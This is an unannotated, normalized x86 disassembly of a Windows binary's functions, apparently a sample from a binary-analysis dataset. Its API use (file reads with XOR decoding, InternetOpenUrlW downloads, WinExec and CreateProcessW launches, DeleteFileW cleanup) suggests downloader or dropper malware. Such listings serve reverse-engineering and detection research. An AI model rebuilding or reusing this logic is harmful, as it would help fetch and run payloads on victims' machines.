mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x4
sub_41ac90
push ebp
mov ebp esp
mov eax 0x1050
call sub_42cc00
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x1018 ] ecx
mov [ ebp - 0x100c ] 0x0
mov [ ebp - 0x1010 ] 0x0
push 0x0
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x1038 ]
push ecx
mov ecx [ ebp - 0x1018 ]
call sub_41a9c0
mov [ ebp - 0x101c ] eax
push r--data
mov ecx [ ebp - 0x101c ]
call sub_401870
push eax
call sub_424744
add esp 0x8
mov [ ebp - 0x100c ] eax
lea ecx [ ebp - 0x1038 ]
call sub_401830
push 0x0
mov edx [ ebp + 0xc ]
push edx
lea eax [ ebp - 0x1050 ]
push eax
mov ecx [ ebp - 0x1018 ]
call sub_41a9c0
mov [ ebp - 0x1020 ] eax
push r--data
mov ecx [ ebp - 0x1020 ]
call sub_401870
push eax
call sub_424744
add esp 0x8
mov [ ebp - 0x1010 ] eax
lea ecx [ ebp - 0x1050 ]
call sub_401830
cmp [ ebp - 0x100c ] 0x0
je r-xdata
xor al al
jmp r-xdata
cmp [ ebp - 0x1010 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0xc
mov [ ebp - 0x1014 ] 0x0
mov ecx [ ebp - 0x100c ]
push ecx
call sub_4232da
add esp 0x4
mov edx [ ebp - 0x1010 ]
push edx
call sub_4232da
add esp 0x4
mov al 0x1
mov edx [ ebp - 0x100c ]
push edx
push 0x1000
push 0x1
lea eax [ ebp - 0x1004 ]
push eax
call sub_422b72
add esp 0x10
mov [ ebp - 0x1014 ] eax
mov [ ebp - 0x1008 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x1008 ]
cmp edx [ ebp - 0x1014 ]
jge r-xdata
mov ecx [ ebp - 0x1010 ]
push ecx
mov edx [ ebp - 0x1014 ]
push edx
push 0x1
lea eax [ ebp - 0x1004 ]
push eax
call sub_422d75
add esp 0x10
jmp r-xdata
mov eax [ ebp - 0x1008 ]
movzx ecx [ ebp + eax - 0x1004 ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x100c ]
push ecx
call sub_424759
add esp 0x4
test eax eax
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x1008 ]
movzx eax [ ebp + edx - 0x1004 ]
cmp eax [ ebp + 0x10 ]
je r-xdata
mov ecx [ ebp - 0x1008 ]
add ecx 0x1
mov [ ebp - 0x1008 ] ecx
mov ecx [ ebp - 0x1008 ]
movzx edx [ ebp + ecx - 0x1004 ]
xor edx [ ebp + 0x10 ]
mov eax [ ebp - 0x1008 ]
mov [ ebp + eax - 0x1004 ] dl
sub_41ae70
push ebp
mov ebp esp
mov eax 0x1050
call sub_42cc00
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x1018 ] ecx
mov [ ebp - 0x1008 ] 0x0
mov [ ebp - 0x100c ] 0x0
push 0x0
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x1038 ]
push ecx
mov ecx [ ebp - 0x1018 ]
call sub_41a9c0
mov [ ebp - 0x1020 ] eax
push r--data
mov ecx [ ebp - 0x1020 ]
call sub_401870
push eax
call sub_424744
add esp 0x8
mov [ ebp - 0x1008 ] eax
lea ecx [ ebp - 0x1038 ]
call sub_401830
push 0x0
mov edx [ ebp + 0xc ]
push edx
lea eax [ ebp - 0x1050 ]
push eax
mov ecx [ ebp - 0x1018 ]
call sub_41a9c0
mov [ ebp - 0x101c ] eax
push r--data
mov ecx [ ebp - 0x101c ]
call sub_401870
push eax
call sub_424744
add esp 0x8
mov [ ebp - 0x100c ] eax
lea ecx [ ebp - 0x1050 ]
call sub_401830
cmp [ ebp - 0x1008 ] 0x0
je r-xdata
mov ecx [ ebp + 0xc ]
call sub_40be90
push eax
call [ DeleteFileW@IAT ]
xor al al
jmp r-xdata
cmp [ ebp - 0x100c ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0x1014 ] 0x0
mov [ ebp - 0x1010 ] 0x0
mov [ ebp - 0x1004 ] 0x0
push 0xfff
push 0x0
lea ecx [ ebp - 0x1003 ]
push ecx
call sub_427900
add esp 0xc
push 0x0
mov edx [ rw-data ]
push edx
mov eax [ ebp - 0x1008 ]
push eax
call sub_4231ef
add esp 0xc
mov edx [ ebp - 0x1008 ]
push edx
call sub_4232da
add esp 0x4
mov eax [ ebp - 0x100c ]
push eax
call sub_4232da
add esp 0x4
mov al 0x1
mov edx [ ebp - 0x1008 ]
push edx
push 0x1000
push 0x1
lea eax [ ebp - 0x1004 ]
push eax
call sub_422b72
add esp 0x10
mov [ ebp - 0x1010 ] eax
mov ecx [ ebp - 0x100c ]
push ecx
mov edx [ ebp - 0x1010 ]
push edx
push 0x1
lea eax [ ebp - 0x1004 ]
push eax
call sub_422d75
add esp 0x10
mov ecx [ ebp - 0x1014 ]
add ecx [ ebp - 0x1010 ]
mov [ ebp - 0x1014 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x1008 ]
push ecx
call sub_424759
add esp 0x4
test eax eax
jne r-xdata
sub_41b040
push ebp
mov ebp esp
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x60 ] ecx
mov [ ebp - 0x48 ] 0x44
push 0x40
push 0x0
lea eax [ ebp - 0x44 ]
push eax
call sub_427900
add esp 0xc
mov [ ebp - 0x1c ] 0x1
mov ecx 0x5
mov [ ebp - 0x18 ] cx
lea edx [ ebp - 0x58 ]
push edx
lea eax [ ebp - 0x48 ]
push eax
push 0x0
push 0x0
push 0x10
push 0x0
push 0x0
push 0x0
mov ecx [ ebp + 0x8 ]
call sub_40be90
push eax
push 0x0
call [ CreateProcessW@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x5a ] 0x0
mov [ ebp - 0x5a ] 0x1
jmp r-xdata
mov al [ ebp - 0x59 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x54 ]
push eax
call [ CloseHandle@IAT ]
mov ecx [ ebp - 0x58 ]
push ecx
call [ CloseHandle@IAT ]
mov cl [ ebp - 0x5a ]
mov [ ebp - 0x59 ] cl
movzx edx [ ebp - 0x59 ]
test edx edx
je r-xdata
sub_41b0f0
push ebp
mov ebp esp
push 0xffffffff
push sub_43bd8d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2e0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x270 ] ecx
lea eax [ ebp - 0x2ec ]
push eax
mov ecx [ ebp - 0x270 ]
call sub_41abd0
mov [ ebp - 0x288 ] eax
mov ecx [ ebp - 0x288 ]
mov [ ebp - 0x278 ] ecx
mov [ ebp - 0x4 ] 0x0
push r--data
mov edx [ ebp - 0x278 ]
push edx
lea eax [ ebp - 0x234 ]
push eax
call sub_41b4f0
add esp 0xc
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0x2ec ]
call sub_40bdc0
lea ecx [ ebp - 0x234 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x270 ]
call sub_41ae70
mov [ ebp - 0x265 ] al
movzx eax [ ebp - 0x265 ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x2d4 ]
push ecx
mov ecx [ ebp - 0x270 ]
call sub_41abd0
mov [ ebp - 0x27c ] eax
mov edx [ ebp - 0x27c ]
mov [ ebp - 0x284 ] edx
mov [ ebp - 0x4 ] 0x3
push r--data
mov eax [ ebp - 0x284 ]
push eax
lea ecx [ ebp - 0x24c ]
push ecx
call sub_41b4f0
add esp 0xc
mov [ ebp - 0x4 ] 0x5
lea ecx [ ebp - 0x2d4 ]
call sub_40bdc0
mov edx [ rw-data ]
push edx
lea eax [ ebp - 0x24c ]
push eax
lea ecx [ ebp - 0x234 ]
push ecx
mov ecx [ ebp - 0x270 ]
call sub_41ac90
mov [ ebp - 0x265 ] al
lea ecx [ ebp - 0x234 ]
call sub_40be90
push eax
call [ DeleteFileW@IAT ]
movzx edx [ ebp - 0x265 ]
test edx edx
jne r-xdata
mov [ ebp - 0x26b ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x234 ]
call sub_40bdc0
mov al [ ebp - 0x26b ]
jmp r-xdata
lea eax [ ebp - 0x264 ]
push eax
mov ecx [ ebp - 0x270 ]
call sub_41aaf0
mov [ ebp - 0x4 ] 0x6
lea ecx [ ebp - 0x264 ]
call sub_40be90
push eax
lea ecx [ ebp - 0x24c ]
call sub_40be90
push eax
call sub_4071c0
add esp 0x8
mov [ ebp - 0x280 ] eax
lea ecx [ ebp - 0x24c ]
call sub_40be90
push eax
call [ DeleteFileW@IAT ]
cmp [ ebp - 0x280 ] 0x0
je r-xdata
mov [ ebp - 0x268 ] 0x0
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0x24c ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x234 ]
call sub_40bdc0
mov al [ ebp - 0x268 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x8
xor ecx ecx
mov [ ebp - 0x218 ] cx
push 0x206
push 0x0
lea edx [ ebp - 0x216 ]
push edx
call sub_427900
add esp 0xc
lea ecx [ ebp - 0x264 ]
call sub_401890
mov [ ebp - 0x28c ] eax
mov [ ebp - 0x274 ] 0x0
jmp r-xdata
mov [ ebp - 0x267 ] 0x0
mov [ ebp - 0x4 ] 0x5
lea ecx [ ebp - 0x264 ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0x24c ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x234 ]
call sub_40bdc0
mov al [ ebp - 0x267 ]
jmp r-xdata
mov ecx [ ebp - 0x274 ]
cmp ecx [ ebp - 0x28c ]
jge r-xdata
mov ecx rw-data
call sub_40be90
push eax
lea eax [ ebp - 0x218 ]
push eax
call [ PathAppendW@IAT ]
mov ecx [ ebp + 0xc ]
movzx edx [ ecx ]
test edx edx
je r-xdata
mov edx [ ebp - 0x274 ]
push edx
lea ecx [ ebp - 0x264 ]
call sub_41a320
mov ecx [ ebp - 0x274 ]
mov dx [ eax ]
mov [ ebp + ecx * 2 - 0x218 ] dx
jmp r-xdata
mov [ ebp - 0x269 ] 0x1
lea edx [ ebp - 0x218 ]
push edx
lea ecx [ ebp - 0x2bc ]
call sub_40bd80
mov [ ebp - 0x4 ] 0x8
lea eax [ ebp - 0x269 ]
push eax
lea ecx [ ebp - 0x2bc ]
push ecx
lea ecx [ ebp - 0x219 ]
call sub_41f200
mov [ ebp - 0x265 ] al
mov [ ebp - 0x4 ] 0x6
lea ecx [ ebp - 0x2bc ]
call sub_40bdc0
lea eax [ ebp - 0x218 ]
push eax
lea ecx [ ebp - 0x2a4 ]
call sub_40bd80
mov [ ebp - 0x4 ] 0x7
lea ecx [ ebp - 0x2a4 ]
push ecx
mov ecx [ ebp - 0x270 ]
call sub_41b040
mov [ ebp - 0x265 ] al
mov [ ebp - 0x4 ] 0x6
lea ecx [ ebp - 0x2a4 ]
call sub_40bdc0
jmp r-xdata
mov eax [ ebp - 0x274 ]
add eax 0x1
mov [ ebp - 0x274 ] eax
mov [ ebp - 0x266 ] 0x1
mov [ ebp - 0x4 ] 0x5
lea ecx [ ebp - 0x264 ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0x24c ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x234 ]
call sub_40bdc0
mov al [ ebp - 0x266 ]
mov [ ebp - 0x26a ] 0x0
mov [ ebp - 0x4 ] 0x5
lea ecx [ ebp - 0x264 ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0x24c ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x234 ]
call sub_40bdc0
mov al [ ebp - 0x26a ]
jmp r-xdata
movzx edx [ ebp - 0x265 ]
test edx edx
jne r-xdata
sub_41b4f0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
call sub_41b530
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp + 0x8 ]
call sub_41a2d0
mov ecx [ ebp - 0x4 ]
or ecx 0x1
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_41b530
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_40bc30
add esp 0x4
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_41b560
mov esp ebp
pop ebp
retn 0x4
sub_41b560
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40c2f0
movzx ecx al
test ecx ecx
je r-xdata
mov eax [ ebp - 0x4 ]
or ecx 0xffffffff
sub ecx [ eax + 0x10 ]
cmp ecx [ ebp + 0xc ]
ja r-xdata
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov ecx [ ebp + 0x8 ]
sub ecx eax
sar ecx 0x1
push ecx
mov edx [ ebp - 0x4 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_41b620
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov ecx [ ebp - 0x4 ]
call sub_402040
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
add eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40c240
movzx edx al
test edx edx
je r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x10 ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_40bc90
add esp 0xc
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40bff0
sub_41b620
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
call sub_401890
cmp eax [ ebp + 0xc ]
jae r-xdata
mov ecx [ ebp + 0x8 ]
call sub_401890
sub eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x10 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
call sub_401d20
mov edx [ ebp - 0x4 ]
or eax 0xffffffff
sub eax [ edx + 0x10 ]
cmp eax [ ebp + 0x10 ]
ja r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ebp + 0x10 ] ecx
cmp [ ebp + 0x10 ] 0x0
jbe r-xdata
mov ecx [ ebp - 0x4 ]
call sub_402040
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
add edx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edx
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40c240
movzx ecx al
test ecx ecx
je r-xdata
mov edx [ ebp + 0x10 ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_40c0d0
mov ecx [ ebp + 0xc ]
lea edx [ eax + ecx * 2 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + edx * 2 ]
push eax
call sub_40bc90
add esp 0xc
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40bff0
sub_41b6e0
push ebp
mov ebp esp
push 0xffffffff
push sub_43bed8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x2c ] 0x0
mov ecx [ ebp + 0xc ]
call sub_4134f0
movzx eax al
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
call sub_401890
mov [ ebp - 0x34 ] eax
push 0x0
push 0x0
mov edx [ ebp - 0x34 ]
push edx
mov ecx [ ebp + 0xc ]
call sub_41a290
push eax
push 0x0
mov eax [ ebp + 0x10 ]
push eax
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x30 ] eax
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
call sub_40bd50
mov ecx [ ebp - 0x2c ]
or ecx 0x1
mov [ ebp - 0x2c ] ecx
mov eax [ ebp + 0x8 ]
jmp r-xdata
lea ecx [ ebp - 0x28 ]
call sub_40bd50
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp - 0x30 ]
push edx
lea ecx [ ebp - 0x28 ]
call sub_41a360
mov eax [ ebp - 0x30 ]
push eax
push 0x0
lea ecx [ ebp - 0x28 ]
call sub_41a320
push eax
mov ecx [ ebp - 0x34 ]
push ecx
mov ecx [ ebp + 0xc ]
call sub_41a290
push eax
push 0x0
mov edx [ ebp + 0x10 ]
push edx
call [ MultiByteToWideChar@IAT ]
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_41a2d0
mov ecx [ ebp - 0x2c ]
or ecx 0x1
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_40bdc0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
call sub_40bd50
mov ecx [ ebp - 0x2c ]
or ecx 0x1
mov [ ebp - 0x2c ] ecx
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0xc
sub_41b810
push ebp
mov ebp esp
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x50 ] ecx
xor eax eax
mov [ ebp - 0x44 ] ax
push 0x3e
push 0x0
lea ecx [ ebp - 0x42 ]
push ecx
call sub_427900
add esp 0xc
mov [ ebp - 0x48 ] 0x40
mov [ ebp - 0x4c ] 0x0
lea edx [ ebp - 0x4c ]
push edx
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x44 ]
push ecx
push 0x5
mov edx [ ebp + 0x8 ]
push edx
call [ HttpQueryInfoW@IAT ]
lea eax [ ebp - 0x44 ]
push eax
call sub_42314c
add esp 0x4
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x4
sub_41b880
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x260 ] ecx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x278 ]
push ecx
mov ecx [ ebp - 0x260 ]
call sub_41b6e0
mov [ ebp - 0x25c ] eax
lea edx [ ebp - 0x254 ]
push edx
mov ecx [ ebp - 0x25c ]
call sub_40be90
push eax
call [ FindFirstFileW@IAT ]
mov [ ebp - 0x258 ] eax
lea ecx [ ebp - 0x278 ]
call sub_40bdc0
cmp [ ebp - 0x258 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x258 ]
push eax
call [ FindClose@IAT ]
mov al 0x1
xor al al
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x4
sub_41b910
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x10 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_401890
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp - 0x18 ]
jge r-xdata
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov edx [ ebp - 0x4 ]
push edx
mov ecx [ ebp + 0xc ]
call sub_410210
movsx eax [ eax ]
cmp eax 0x5c
jne r-xdata
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0xc ] 0x1
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp + 0x10 ]
mov cl [ ebp - 0xc ]
mov [ eax ] cl
mov edx [ ebp - 0x10 ]
push edx
push 0x0
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_40ffd0
mov ecx [ ebp - 0x14 ]
or ecx 0x1
mov [ ebp - 0x14 ] ecx
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
sub_41b9c0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor al al
jmp r-xdata
mov eax [ ebp + 0x8 ]
movsx ecx [ eax ]
test ecx ecx
jne r-xdata
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
push edx
call [ GetFileAttributesA@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
mov al 0x1
xor al al
jmp r-xdata
sub_41ba00
push ebp
mov ebp esp
push 0xffffffff
push sub_43be30
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x11 ] 0x1
lea eax [ ebp - 0x11 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
lea edx [ ebp - 0x2c ]
push edx
mov ecx [ ebp - 0x4c ]
call sub_41b910
mov [ ebp - 0x4 ] 0x0
movzx eax [ ebp - 0x11 ]
test eax eax
je r-xdata
movzx edx [ ebp - 0x11 ]
test edx edx
je r-xdata
lea ecx [ ebp - 0x2c ]
call sub_401870
push eax
mov ecx [ ebp - 0x4c ]
call sub_41b9c0
movzx ecx al
test ecx ecx
je r-xdata
mov [ ebp - 0x45 ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x2c ]
call sub_401830
mov al [ ebp - 0x45 ]
lea eax [ ebp - 0x2c ]
push eax
mov ecx [ ebp - 0x4c ]
call sub_41b880
movzx ecx al
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x2c ]
call sub_401870
push eax
call sub_4247b2
add esp 0x4
test eax eax
je r-xdata
push r--data
lea ecx [ ebp - 0x44 ]
call sub_4017f0
mov [ ebp - 0x4 ] 0x1
lea edx [ ebp - 0x2c ]
push edx
lea ecx [ ebp - 0x44 ]
call sub_416f70
push 0x0
lea ecx [ ebp - 0x44 ]
call sub_401870
push eax
call [ WinExec@IAT ]
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x44 ]
call sub_401830
mov [ ebp - 0x46 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x2c ]
call sub_401830
mov al [ ebp - 0x46 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x4
sub_41bb20
push ebp
mov ebp esp
push 0xffffffff
push sub_43bea8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
lea ecx [ ebp - 0x11 ]
call sub_401a30
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x18 ]
mov edx [ ecx + 0x30 ]
push edx
push 0x1
mov eax [ ebp - 0x18 ]
add eax 0x18
push eax
mov ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x11 ]
call sub_41bc30
mov edx [ ebp - 0x18 ]
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x0
push 0x1
mov ecx [ ebp - 0x1c ]
call sub_41bbe0
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x11 ]
call sub_40cb60
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x4
sub_41bbe0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_41bc10
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call j_sub_422732#2
add esp 0x4
sub_41bc30
push ebp
mov ebp esp
push 0xffffffff
push sub_43be6e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x454
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x430 ] ecx
movzx eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp - 0x430 ]
call sub_41ba00
mov [ ebp - 0x414 ] 0x1
mov [ ebp - 0x415 ] 0x0
mov [ ebp - 0x41c ] 0x0
mov [ ebp - 0x420 ] 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push r--data
call [ InternetOpenW@IAT ]
mov [ ebp - 0x428 ] eax
cmp [ ebp - 0x428 ] 0x0
je r-xdata
push 0x34
call sub_42257f
add esp 0x4
mov [ ebp - 0x440 ] eax
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x440 ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x460 ]
push ecx
mov ecx [ ebp - 0x430 ]
call sub_41b6e0
mov [ ebp - 0x448 ] eax
push 0x0
push 0x4000000
push 0x0
push 0x0
mov ecx [ ebp - 0x448 ]
call sub_40be90
push eax
mov edx [ ebp - 0x428 ]
push edx
call [ InternetOpenUrlW@IAT ]
mov [ ebp - 0x424 ] eax
lea ecx [ ebp - 0x460 ]
call sub_40bdc0
cmp [ ebp - 0x424 ] 0x0
je r-xdata
mov [ ebp - 0x438 ] 0x0
mov ecx [ ebp - 0x440 ]
call sub_41bf90
mov [ ebp - 0x438 ] eax
jmp r-xdata
movzx ecx [ ebp - 0x415 ]
test ecx ecx
je r-xdata
movzx ecx [ ebp - 0x415 ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x428 ]
push eax
call [ InternetCloseHandle@IAT ]
mov [ ebp - 0x428 ] 0x0
mov eax [ ebp - 0x424 ]
push eax
mov ecx [ ebp - 0x430 ]
call sub_41b810
mov [ ebp - 0x420 ] eax
cmp [ ebp - 0x420 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x10
mov ecx [ ebp - 0x438 ]
mov [ ebp - 0x444 ] ecx
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ ebp - 0x444 ]
mov [ ebp - 0x42c ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x42c ]
call sub_410150
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x42c ]
add ecx 0x18
call sub_410150
mov edx [ ebp - 0x42c ]
mov eax [ ebp + 0x14 ]
mov [ edx + 0x30 ] eax
push 0x0
push 0x0
mov ecx [ ebp - 0x42c ]
push ecx
push sub_41bb20
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov al 0x1
